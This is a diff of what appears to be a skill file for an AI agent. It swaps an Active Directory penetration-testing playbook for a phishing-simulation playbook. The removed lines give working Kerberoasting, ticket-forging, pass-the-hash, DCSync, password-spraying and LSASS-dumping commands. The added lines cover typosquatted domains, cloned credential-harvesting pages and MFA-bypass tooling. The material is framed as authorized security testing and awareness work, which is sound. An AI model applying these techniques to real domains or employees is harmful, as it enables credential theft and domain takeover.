@@ -1,4 +1,4 @@
-## executing-active-directory-attack-simulation
+## executing-phishing-simulation-campaign
 
 > >
 
@@ -36,163 +36,173 @@ Durable memory is mandatory. Every task must result in a persistent artifact:
 
 ---
 
-# Executing Active Directory Attack Simulation
+# Executing Phishing Simulation Campaign
 
-You are the Executing Active Directory Attack Simulation Specialist at Galyarder Labs.
+You are the Executing Phishing Simulation Campaign Specialist at Galyarder Labs.
 ## When to Use
 
-- Assessing the security of an Active Directory domain and forest against common and advanced attack techniques
-- Identifying attack paths from low-privilege domain user to Domain Admin using privilege relationship analysis
-- Validating that Kerberos security configurations, credential policies, and delegation settings resist known attacks
-- Testing detection capabilities of the SOC and EDR tools against Active Directory-specific TTPs
-- Evaluating the effectiveness of tiered administration models and privileged access workstations
+- Measuring employee susceptibility to phishing attacks as part of a security awareness program
+- Testing the effectiveness of email security controls (secure email gateway, DMARC, SPF, DKIM)
+- Conducting the social engineering component of a red team exercise to gain initial access
+- Establishing a baseline for phishing susceptibility before deploying security awareness training
+- Validating that incident response procedures work when employees report suspicious emails
 
-**Do not use** without explicit written authorization from the domain owner, against production domain controllers during business hours unless approved, or for testing that could cause account lockouts affecting real users without prior coordination.
+**Do not use** without explicit written authorization from the organization's leadership, for actual credential theft beyond the authorized scope, for targeting individuals personally rather than professionally, or for sending phishing emails that could cause psychological harm or legal liability.
 
 ## Prerequisites
 
-- Written authorization specifying the target AD domain, testing constraints, and any off-limits accounts or systems
-- Low-privilege domain user account (minimum starting point) to simulate realistic attacker position
-- Testing workstation joined to the domain or network access to domain controllers on ports 88, 135, 139, 389, 445, 636, 3268, 3269
-- BloodHound Community Edition or Enterprise with SharpHound/AzureHound collectors
-- Impacket toolkit, Mimikatz (or pypykatz), Rubeus, and CrackMapExec installed on the attack platform
-- Hashcat or John the Ripper with current wordlists (rockyou.txt, SecLists) for offline credential cracking
+- Written authorization from executive leadership specifying the campaign scope, target groups, and escalation procedures
+- Coordination with the IT/security team to whitelist the sending infrastructure (or test whether it bypasses controls, depending on scope)
+- GoPhish or equivalent phishing platform configured with a sending domain, SMTP relay, and landing page infrastructure
+- Phishing domain registered and configured with SPF, DKIM, and DMARC records to maximize deliverability
+- Employee email list from HR, organized by department for targeted campaigns
+- Incident response team briefed on the campaign timeline and escalation procedures
 
 ## Workflow
 
-### Step 1: Active Directory Reconnaissance
+### Step 1: Campaign Planning and Pretext Development
 
-Enumerate the AD environment from a low-privilege domain user position:
+Design realistic phishing scenarios based on threats relevant to the target organization:
 
-- **Domain enumeration**: `Get-ADDomain` or `crackmapexec smb <dc_ip> -u <user> -p <pass> --domains` to identify domain name, functional level, domain controllers, and forest trusts
-- **User enumeration**: `Get-ADUser -Filter * -Properties ServicePrincipalName,AdminCount,PasswordLastSet` to identify service accounts, privileged accounts, and stale passwords
-- **Group enumeration**: Map membership of high-value groups (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Backup Operators) using `net group "Domain Admins" /domain`
-- **GPO enumeration**: `Get-GPO -All | Get-GPOReport -ReportType XML` to identify Group Policy configurations including password policies, audit settings, and software deployment
-- **Trust enumeration**: `nltest /domain_trusts /all_trusts` to map inter-domain and inter-forest trusts, noting trust direction and transitivity
-- **LDAP queries**: Use `ldapsearch` or ADExplorer to search for accounts with `userAccountControl` flags indicating "password never expires", "password not required", or "DES-only Kerberos"
+- **Pretext selection**: Choose scenarios that mirror real-world attacks:
+  - IT support: Password expiration notice requiring immediate action
+  - HR department: Benefits enrollment, policy acknowledgment, W-2/tax document
+  - Executive impersonation: Urgent request from CEO/CFO to review a document
+  - Vendor/supplier: Invoice requiring review, delivery notification
+  - Cloud services: Microsoft 365 shared document, Google Drive access, Zoom meeting invitation
+- **Target segmentation**: Divide employees into groups by department, role, or access level. High-value targets (finance, IT admin, executives) may receive more sophisticated pretexts.
+- **Timing**: Schedule sends during business hours, preferably Tuesday-Thursday when email engagement is highest. Avoid holidays, mass layoff periods, or other sensitive times.
+- **Success metrics**: Define what constitutes campaign success: email open rate, link click rate, credential submission rate, report rate (employees who report the phish to IT)
 
-### Step 2: BloodHound Attack Path Analysis
+### Step 2: Infrastructure Setup
 
-Collect and analyze AD relationship data to identify the shortest paths to Domain Admin:
+Configure the phishing infrastructure:
 
-- Run SharpHound collector: `SharpHound.exe -c All,GPOLocalGroup --outputdirectory C:\temp\` to collect users, groups, sessions, ACLs, trusts, and GPO data
-- Import the JSON output into BloodHound and run built-in queries:
-  - "Shortest Paths to Domain Admins from Owned Principals"
-  - "Find Principals with DCSync Rights"
-  - "Find Computers where Domain Users are Local Admin"
-  - "Shortest Paths to Unconstrained Delegation Systems"
-  - "Find All Paths from Kerberoastable Users"
-- Mark the compromised user as "owned" in BloodHound and analyze the resulting attack paths
-- Identify ACL-based attack paths: GenericAll, GenericWrite, WriteDACL, WriteOwner, ForceChangePassword on high-value objects
-- Document each identified attack path with the chain of relationships and affected objects
+- **Domain registration**: Register a domain that resembles the target organization's domain (typosquatting, homograph, or brand-adjacent). Examples: `target-corp.com`, `targetcorp-portal.com`, `targetsupport.net`
+- **SSL certificate**: Obtain a TLS certificate for the phishing domain (Let's Encrypt) to display the padlock icon
+- **GoPhish configuration**:
+  - Set up the GoPhish server on a VPS with the phishing domain
+  - Configure the SMTP sending profile with the phishing domain's mail server
+  - Create the email template with tracking pixel and link to the landing page
+  - Build the credential harvesting landing page that mirrors the target's login portal
+  - Import the target email list and create user groups
+- **Email authentication**: Configure SPF, DKIM, and DMARC records for the phishing domain to pass email authentication checks and improve delivery rates
+- **Test delivery**: Send test emails to a controlled inbox to verify rendering, link tracking, and landing page functionality
 
-### Step 3: Kerberos Attacks
+### Step 3: Campaign Execution
 
-Execute Kerberos-based attacks against identified vulnerable accounts:
+Launch the phishing campaign:
 
-- **Kerberoasting**: Request TGS tickets for accounts with SPNs: `impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <dc_ip> -request -outputfile kerberoast.hashes`. Crack offline with `hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt`
-- **AS-REP Roasting**: Target accounts without Kerberos pre-authentication: `impacket-GetNPUsers <domain>/ -dc-ip <dc_ip> -usersfile users.txt -format hashcat -outputfile asrep.hashes`. Crack with `hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt`
-- **Silver Ticket**: If a service account's NTLM hash is cracked, forge a TGS ticket for that service using `impacket-ticketer -nthash <hash> -domain-sid <sid> -domain <domain> -spn <service/host> <username>`
-- **Golden Ticket**: If the krbtgt hash is obtained (post-domain compromise), forge a TGT: `mimikatz "kerberos::golden /user:Administrator /domain:<domain> /sid:<sid> /krbtgt:<hash> /ticket:golden.kirbi"`
-- **Unconstrained Delegation abuse**: Identify computers with unconstrained delegation. Coerce authentication from a Domain Controller using PrinterBug or PetitPotam, then capture the DC's TGT from memory.
+- Send emails in batches to avoid triggering rate limits or spam filters (e.g., 50 emails per hour)
+- Monitor GoPhish dashboard in real-time for delivery failures, bounces, and early interactions
+- Track metrics as they come in: emails sent, emails opened (tracking pixel fired), links clicked, credentials submitted
+- If the IT security team or SOC detects the campaign (if this is part of the test), document the detection time and response actions
+- Maintain an emergency stop procedure: if an employee becomes distressed or the campaign creates unintended consequences, pause immediately
+- Run the campaign for 48-72 hours before closing the landing page, as most interactions occur within the first 24 hours
 
-### Step 4: Credential Attacks and Lateral Movement
+### Step 4: Credential Capture and Access Demonstration
 
-Exploit harvested credentials to move through the domain:
+Process captured credentials to demonstrate impact (if authorized):
 
-- **Pass-the-Hash**: `impacket-psexec <domain>/<user>@<target> -hashes <LM:NTLM>` to execute commands on systems where the compromised account has local admin
-- **Pass-the-Ticket**: `export KRB5CCNAME=ticket.ccache && impacket-psexec <domain>/<user>@<target> -k -no-pass` to use captured or forged Kerberos tickets
-- **NTLM Relay**: Configure `impacket-ntlmrelayx -t ldap://<dc_ip> --escalate-user <user>` and coerce authentication to relay NTLM credentials for privilege escalation
-- **DCSync**: If DCSync rights are obtained (Replicating Directory Changes): `impacket-secretsdump <domain>/<user>:<pass>@<dc_ip> -just-dc-ntlm` to dump all domain password hashes
-- **Password spraying**: `crackmapexec smb <dc_ip> -u users.txt -p 'Winter2025!' --no-bruteforce` testing one password across all accounts to avoid lockouts
-- **LSASS dump**: On compromised hosts, extract credentials from LSASS memory using `mimikatz "sekurlsa::logonpasswords"` or `procdump -ma lsass.exe lsass.dmp` followed by offline extraction
+- Review all captured credentials in GoPhish. Do not test credentials against real systems unless explicitly authorized.
+- If authorized for full exploitation: test captured credentials against the organization's actual login portal (VPN, OWA, SSO)
+- Document any accounts that were successfully compromised, what data they could access, and whether MFA was present
+- If MFA blocks access, document that MFA prevented the compromise and recommend maintaining MFA enforcement
+- Identify patterns in credential submissions: which departments, roles, or locations are most susceptible
 
-### Step 5: Privilege Escalation to Domain Admin
+### Step 5: Analysis and Reporting
 
-Chain discovered attack paths to escalate from low-privilege user to Domain Admin:
+Analyze campaign results and produce the assessment report:
 
-- Follow the shortest path identified in BloodHound by executing each relationship (e.g., GenericWrite on a user -> set SPN -> Kerberoast -> crack password -> user is member of a group with WriteDACL on Domain Admins -> grant self membership)
-- Exploit Group Policy Preferences (GPP) passwords if found: `crackmapexec smb <dc_ip> -u <user> -p <pass> -M gpp_autologon`
-- Target LAPS (Local Administrator Password Solution) if deployed: query LAPS passwords with `Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd`
-- Abuse certificate services (AD CS) with Certipy: `certipy find -vulnerable -u <user>@<domain> -p <pass> -dc-ip <dc_ip>` to find exploitable certificate templates (ESC1-ESC8)
-- Document the complete attack chain from initial user to Domain Admin with every credential, tool, and technique used
+- **Metrics analysis**:
+  - Email delivery rate: percentage of emails that reached inboxes
+  - Open rate: percentage of recipients who opened the email
+  - Click rate: percentage who clicked the phishing link
+  - Submission rate: percentage who submitted credentials
+  - Report rate: percentage who reported the email to IT security
+- **Departmental comparison**: Compare susceptibility rates across departments to identify groups needing targeted training
+- **Email security effectiveness**: Document whether the phishing emails bypassed the secure email gateway, whether DMARC/SPF prevented delivery, and whether link scanning tools detected the phishing URL
+- **Recommendations**: Provide actionable recommendations including security awareness training topics, technical controls improvements, and policy changes
 
 ## Key Concepts
 
 | Term | Definition |
 |------|------------|
-| **Kerberoasting** | Requesting Kerberos TGS tickets for accounts with Service Principal Names and cracking them offline to recover the service account's plaintext password |
-| **AS-REP Roasting** | Requesting Kerberos AS-REP responses for accounts without pre-authentication enabled and cracking the encrypted timestamp offline |
-| **DCSync** | Using Directory Replication Service privileges (DS-Replication-Get-Changes-All) to replicate password data from a domain controller, mimicking the behavior of a DC |
-| **BloodHound** | Graph-based Active Directory analysis tool that maps privilege relationships and identifies attack paths from any user to high-value targets like Domain Admin |
-| **Unconstrained Delegation** | A Kerberos delegation configuration where a service can impersonate any user to any other service, allowing TGT capture from connecting users |
-| **Pass-the-Hash** | Authentication technique using an NTLM hash directly instead of the plaintext password, exploiting Windows NTLM authentication |
-| **AD CS Abuse** | Exploiting misconfigured Active Directory Certificate Services templates to request certificates that grant elevated privileges or impersonate other users |
-| **NTLM Relay** | Forwarding captured NTLM authentication to a different service to authenticate as the victim, effective when SMB signing is not enforced |
+| **Pretext** | The fabricated scenario and social context used to persuade the target to take a desired action such as clicking a link or entering credentials |
+| **Credential Harvesting** | Collecting usernames and passwords through fake login pages that mimic legitimate services |
+| **GoPhish** | Open-source phishing simulation platform that manages email templates, landing pages, target groups, and campaign tracking |
+| **Spear Phishing** | Targeted phishing directed at specific individuals using personalized information gathered through reconnaissance |
+| **Typosquatting** | Registering domains that are visually similar to legitimate domains through character substitution, addition, or omission |
+| **Security Awareness** | Training programs designed to educate employees about social engineering threats and proper reporting procedures |
+| **DMARC** | Domain-based Message Authentication, Reporting, and Conformance; email authentication protocol that prevents unauthorized use of a domain for sending email |
 
 ## Tools & Systems
 
-- **BloodHound**: Attack path analysis tool that ingests AD data collected by SharpHound to visualize and identify privilege escalation paths through object relationships
-- **Impacket**: Python toolkit for network protocol interactions including Kerberos attacks (GetUserSPNs, GetNPUsers), credential dumping (secretsdump), and remote execution (psexec, wmiexec)
-- **Mimikatz**: Post-exploitation tool for extracting plaintext credentials, NTLM hashes, and Kerberos tickets from Windows memory (LSASS process)
-- **CrackMapExec**: Multi-protocol attack tool for Active Directory environments supporting SMB, LDAP, WinRM, and MSSQL with built-in modules for password spraying and enumeration
-- **Certipy**: Python tool for enumerating and exploiting Active Directory Certificate Services (AD CS) misconfigurations
+- **GoPhish**: Open-source phishing simulation framework providing campaign management, email templates, landing pages, and detailed analytics
+- **Evilginx2**: Advanced phishing framework capable of capturing session tokens and bypassing multi-factor authentication through reverse proxy technique
+- **King Phisher**: Phishing campaign toolkit with advanced features including two-factor authentication testing and geolocation tracking
+- **SET (Social Engineering Toolkit)**: Framework for social engineering attacks including phishing, credential harvesting, and payload delivery
 
 ## Common Scenarios
 
-### Scenario: Domain Compromise Assessment for a Healthcare Organization
+### Scenario: Enterprise Phishing Simulation for Security Awareness Baseline
 
-**Context**: A hospital network with a single Active Directory forest containing 5,000 user accounts, 800 computer objects, and 15 domain controllers across 3 sites. The tester starts with a single low-privilege domain user account. The goal is to determine if an attacker with stolen employee credentials could escalate to Domain Admin.
+**Context**: A 2,000-employee company has never conducted a phishing simulation. The CISO wants to establish a baseline susceptibility rate before deploying a new security awareness training program. The campaign should test all employees using a realistic but not overly sophisticated pretext.
 
 **Approach**:
-1. Run SharpHound to collect AD relationship data and import into BloodHound
-2. BloodHound reveals a path: owned user -> member of IT-Support group -> GenericAll on SVC-SQL account -> SVC-SQL has SPN -> Kerberoast -> SVC-SQL is local admin on DB-SERVER-01 -> DB-SERVER-01 has a Domain Admin session
-3. Kerberoast SVC-SQL, crack the weak password (Summer2023!) in 12 minutes using hashcat
-4. Use SVC-SQL credentials to access DB-SERVER-01 via psexec
-5. Extract Domain Admin credentials from LSASS memory on DB-SERVER-01
-6. Validate domain compromise by performing DCSync to dump all domain hashes
-7. Report the complete attack chain with remediation: set 25+ character passwords on service accounts, enable AES-only Kerberos encryption, remove unnecessary local admin rights, implement tiered administration
+1. Develop a Microsoft 365 password expiration pretext: "Your password expires in 24 hours. Click here to update."
+2. Register `m365-targetcorp.com`, set up GoPhish, and build a landing page cloning the Microsoft 365 login portal
+3. Import all 2,000 employee emails and schedule sends in batches of 100 over 20 hours
+4. Campaign results after 72 hours: 1,847 delivered (92.4%), 1,243 opened (67.3%), 487 clicked (26.4%), 312 submitted credentials (16.9%), 23 reported to IT (1.2%)
+5. Analysis reveals Finance (28% submission) and Marketing (24% submission) have the highest susceptibility; IT department has the lowest (4%)
+6. Recommend targeted training for high-susceptibility departments, phishing report button deployment, and quarterly simulation cadence
 
 **Pitfalls**:
-- Running SharpHound with noisy collection methods during peak hours, alerting the SOC via excessive LDAP queries
-- Password spraying without checking the domain lockout policy first, locking out hundreds of accounts
-- Forgetting to test for AD CS vulnerabilities which often provide the fastest path to Domain Admin
-- Not checking for stale computer accounts that may still have cached credentials or active sessions
+- Using overly aggressive or threatening pretexts that cause employee anxiety or legal issues
+- Not coordinating with HR and legal before launching the campaign, risking employee relations problems
+- Sending all emails simultaneously, overwhelming the email server or triggering bulk-send detection
+- Focusing only on click and submission rates while ignoring the critically low report rate (1.2%)
 
 ## Output Format
 
 ```
-## Finding: Service Account Vulnerable to Kerberoasting with Weak Password
+## Phishing Simulation Campaign Report
 
-**ID**: AD-002
-**Severity**: Critical (CVSS 9.1)
-**Affected Object**: SVC-SQL@corp.example.com (Service Account)
-**Attack Technique**: MITRE ATT&CK T1558.003 - Kerberoasting
+**Campaign Name**: Q4 2025 Baseline Phishing Assessment
+**Pretext**: Microsoft 365 Password Expiration Notice
+**Campaign Duration**: November 15-18, 2025
+**Target Population**: 2,000 employees (all departments)
 
-**Description**:
-The service account SVC-SQL has a Service Principal Name (MSSQLSvc/db-server-01.corp.example.com:1433)
-registered in Active Directory and uses a weak password that was cracked in 12 minutes
-using hashcat with the rockyou.txt wordlist. This account has local administrator
-privileges on DB-SERVER-01, which had an active Domain Admin session at the time of
-testing.
+### Campaign Metrics
+| Metric | Count | Rate |
+|--------|-------|------|
+| Emails Sent | 2,000 | 100% |
+| Emails Delivered | 1,847 | 92.4% |
+| Emails Opened | 1,243 | 67.3% |
+| Links Clicked | 487 | 26.4% |
+| Credentials Submitted | 312 | 16.9% |
+| Reported to IT | 23 | 1.2% |
 
-**Attack Chain**:
-1. Requested TGS ticket: impacket-GetUserSPNs corp.example.com/testuser:password -request
-2. Cracked hash: hashcat -m 13100 hash.txt rockyou.txt (cracked in 12m: Summer2023!)
-3. Lateral movement: impacket-psexec corp.example.com/SVC-SQL:Summer2023!@db-server-01
-4. Credential extraction: mimikatz sekurlsa::logonpasswords -> Domain Admin NTLM hash
+### Department Breakdown
+| Department | Employees | Clicked | Submitted | Reported |
+|------------|-----------|---------|-----------|----------|
+| Finance    | 120       | 38.3%   | 28.3%     | 0.8%     |
+| Marketing  | 85        | 35.3%   | 24.7%     | 1.2%     |
+| Engineering| 300       | 15.0%   | 8.3%      | 3.7%     |
+| IT         | 45        | 8.9%    | 4.4%      | 11.1%    |
 
-**Impact**:
-Complete domain compromise from a single low-privilege domain user account. An attacker
-could access all 5,000 user accounts, 800 computer objects, and all data within the domain.
+### Key Findings
+1. Baseline credential submission rate of 16.9% exceeds industry average (12%)
+2. Report rate of 1.2% indicates employees are not trained to report suspicious emails
+3. Finance department is the highest-risk group with 28.3% credential submission rate
+4. Email security gateway did not flag the phishing domain despite being registered 48 hours prior
 
-**Remediation**:
-1. Set a 25+ character randomly generated password for SVC-SQL and all service accounts
-2. Migrate to Group Managed Service Accounts (gMSA) which rotate 120-character passwords automatically
-3. Enable AES256 encryption for Kerberos and disable RC4 (DES) encryption
-4. Remove SVC-SQL from local administrator groups on DB-SERVER-01
-5. Implement Protected Users group for privileged accounts to prevent credential caching
-6. Deploy Microsoft Defender for Identity to detect Kerberoasting and DCSync attacks
+### Recommendations
+1. Deploy mandatory security awareness training with emphasis on phishing identification
+2. Install a phishing report button in email clients and train all employees on its use
+3. Implement DMARC enforcement (p=reject) and enhanced email filtering rules
+4. Conduct targeted training for Finance and Marketing departments
+5. Schedule quarterly phishing simulations to track improvement
 ```
 
 ---
